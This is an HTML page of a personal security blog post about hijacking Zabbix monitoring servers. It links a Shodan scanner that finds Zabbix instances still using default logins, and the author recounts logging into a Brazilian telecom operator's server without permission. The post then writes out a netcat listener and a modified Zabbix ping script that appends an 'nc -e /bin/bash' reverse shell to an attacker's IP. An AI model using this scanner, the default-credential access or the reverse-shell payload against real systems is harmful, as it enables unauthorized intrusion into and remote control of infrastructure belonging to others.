@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>
+    
+    Exploring command injection in Zabbix scripts
+     | Gabriel M. Dutra 
+  </title>
+  <link rel="stylesheet" href='https://blog.coolerbsd.me/css/site.min.css'>
+  <link rel="canonical" href="https://blog.coolerbsd.me/post/exploring-zabbix-scripts/">
+  <link rel="alternate" type="application/rss&#43;xml" href="https://blog.coolerbsd.me/index.xml" title="coolerbsd">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="referrer" content="no-referrer">
+  <meta name="author" content="Gabriel M. Dutra">
+  <meta name="description" content="">
+
+  <meta property="og:title" content="Exploring command injection in Zabbix scripts" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://blog.coolerbsd.me/post/exploring-zabbix-scripts/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-11-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-12-04T18:45:48-03:00" />
+
+
+</head>
+<body><nav class="navbar is-transparent " role="navigation" aria-label="main navigation">
+  <div class="navbar-brand">
+    <a class="navbar-item" href="https://blog.coolerbsd.me/">
+      <figure class="image">
+        <img alt="" class="is-rounded" src="https://avatars.githubusercontent.com/u/105324507">
+      </figure>
+    </a>
+    <a class="navbar-item" href="https://blog.coolerbsd.me/">
+      coolerbsd
+    </a>
+  </div>
+  
+  <div class="navbar-menu">
+    <div class="navbar-start">
+      
+      <a class="navbar-item" href="https://blog.coolerbsd.me/tags/index/">
+        
+        Index
+        
+      </a>
+      
+      <a class="navbar-item" href="https://blog.coolerbsd.me/tags/security/">
+        
+        Security
+        
+      </a>
+      
+    </div>
+    
+    <div class="navbar-end">
+      
+      <a class="navbar-item" href="https://github.com/coolerbsd/" rel="noopener" target="_blank">
+        <span class="icon">
+          
+            <img alt="icons/svg/github.svg" src='https://blog.coolerbsd.me/icons/svg/github.svg'>
+          
+        </span>
+      </a>
+      
+      <a class="navbar-item" href="https://twitter.com/coolerbsd/" rel="noopener" target="_blank">
+        <span class="icon">
+          
+            <img alt="icons/svg/twitter.svg" src='https://blog.coolerbsd.me/icons/svg/twitter.svg'>
+          
+        </span>
+      </a>
+      
+      <a class="navbar-item" href="https://linkedin.com/in/coolerbsd/" rel="noopener" target="_blank">
+        <span class="icon">
+          
+            <img alt="icons/svg/linkedin.svg" src='https://blog.coolerbsd.me/icons/svg/linkedin.svg'>
+          
+        </span>
+      </a>
+      
+      
+      <a class="navbar-item" href="mailto:coolerbsd@proton.me" target="_blank">
+        <span class="icon">
+          <img alt="email" src='https://blog.coolerbsd.me/icons/svg/email.svg'>
+        </span>
+      </a>
+      
+      <a class="navbar-item" href="https://blog.coolerbsd.me/index.xml" target="_blank">
+        <span class="icon">
+          <img alt="rss" src='https://blog.coolerbsd.me/icons/svg/rss.svg'>
+        </span>
+      </a>
+      
+    </div>
+  </div>
+</nav>
+
+  <section>
+    <section class='hero is-small is-info is-fullwidth'>
+      <div class="hero-body">
+<div class="container">
+  <h1 class="title">
+    Exploring command injection in Zabbix scripts
+  </h1>
+  <h2 class="subtitle">
+    <time datetime='2022-11-23T00:00:00Z'>
+      November 23, 2022
+    </time>
+    
+    <br>
+    
+    
+    
+    <a class="tag is-link" href="https://blog.coolerbsd.me/tags/security/">security</a>
+    
+    
+    
+  </h2>
+</div>
+
+      </div>
+    </section>
+    <section class="section">
+      <div class="container">
+<div class="content is-medium">
+  <h2 id="what-is-zabbix">What is Zabbix</h2>
+<p>Zabbix is a software that monitors numerous parameters of a network and the health and integrity of servers, virtual machines, applications, services, databases, websites, the cloud and more. Zabbix uses a flexible notification mechanism that allows users to configure e-mail based alerts for virtually any event. This allows a fast reaction to server problems. Zabbix offers excellent reporting and data visualization features based on the stored data. This makes Zabbix ideal for capacity planning.</p>
+<p><a href="https://www.zabbix.com/documentation/6.0/en/manual/introduction/about">https://www.zabbix.com/documentation/6.0/en/manual/introduction/about</a></p>
+<h2 id="history">History</h2>
+<p>Two years ago, I develop a script to search zabbix with default user and password exposed on the internet. This script use shodan api to search
+the zabbix servers. I recently found this script in my backups and it&rsquo;s working.</p>
+<p>See script in my GitHub
+<a href="https://github.com/0xdutra/hacking/tree/main/zbxstrike">https://github.com/0xdutra/hacking/tree/main/zbxstrike</a></p>
+<p>OBS: My old nickname is zer0dx and I&rsquo;m embarrassed about it :(</p>
+<h3 id="run-script">Run script</h3>
+<p>Run the script using your shodan API key, for that you need to create a shodan account.
+<a href="https://shodan.io/">https://shodan.io/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python3 zbxstrike.py --key &lt;api key&gt; --thread <span style="color:#ae81ff">4</span> 
+</code></pre></div><p>A log file is created in your currently directory, this log file has all zabbix servers found.</p>
+<p><img src="https://0xdutra.github.io/zabbixstrike.png" alt=""></p>
+<p>My scripts found 10 zabbix servers, I logged into a server of a brazilian telecom operator, however, I do not recommend that you do the same :)</p>
+<h3 id="zabbix-scripts">Zabbix scripts</h3>
+<p>Zabbix has a administrator tools, like a ping, traceroute, nmap to discovery OS, etc.</p>
+<p>Let&rsquo;s change these scripts to reverse shell to another server.</p>
+<p>http://&lt;zabbix.example&gt;/zabbix/zabbix.php?action=script.list</p>
+<p><img src="https://0xdutra.github.io/zabbix_scripts.png" alt=""></p>
+<p>On my machine, create a server to receive the reverse shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -nlvp <span style="color:#ae81ff">4444</span>
+</code></pre></div><p>On the zabbix server, change the script to send the shell to server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/bin/ping -c <span style="color:#ae81ff">5</span> <span style="color:#f92672">{</span>HOST.CONN<span style="color:#f92672">}</span> <span style="color:#f92672">&amp;&amp;</span> nc -e /bin/bash &lt;server IP&gt; <span style="color:#ae81ff">4444</span> 2&gt;&amp;<span style="color:#ae81ff">1</span>
+</code></pre></div><p>The last step is ping any zabbix host. The zabbix server will be successfully connected to my server. Now I can run any command on my new zabbix server, rs.</p>
+<p><img src="https://0xdutra.github.io/reverveshell.png" alt=""></p>
+<h2 id="references">References</h2>
+<p><a href="https://owasp.org/www-community/attacks/Command_Injection">Command Injection</a></p>
+<p><a href="https://www.zabbix.com/documentation/current/en/manual/web_interface/frontend_sections/administration/scripts">Zabbix Scripts</a></p>
+<p><a href="https://github.com/0xdutra/hacking/tree/main/zbxstrike">Zabbix strike</a></p>
+</div>
+
+
+      </div>
+    </section>
+  </section><footer class="footer">
+  <div class="content has-text-centered">
+    
+    <p>
+      Last modified December 04, 2022
+      
+      (commit <a href="https://github.com/orf/bare-hugo-theme/commit/a0d4c8f37e328dc65464f931ec8b3645fdacafc4" target="_blank">a0d4c8f</a>)
+      
+    </p>
+    
+    
+    <p>
+      
+      <a href="https://github.com/orf/bare-hugo-theme" target="_blank">Bare Hugo theme.</a>
+      
+      
+      Blog source code <a href="https://github.com/orf/bare-hugo-theme" target="_blank">available on Github</a>.
+      
+    </p>
+    
+  </div>
+</footer>
+
+
+</body>
+</html>
